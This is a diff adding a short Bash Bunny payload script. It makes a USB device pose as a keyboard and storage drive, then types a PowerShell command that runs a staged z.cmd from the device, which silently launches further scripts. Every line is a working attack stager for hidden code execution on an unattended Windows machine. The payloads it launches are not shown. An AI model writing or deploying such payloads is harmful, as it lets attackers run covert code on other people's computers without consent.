@@ -1,0 +1,6 @@
+# Executes z.cmd from the switch position's folder, thus launching x.cmd silently using i.vbs
+GET SWITCH_POSITION
+LED ATTACK
+ATTACKMODE HID STORAGE
+RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\z.cmd')"
+LED FINISH
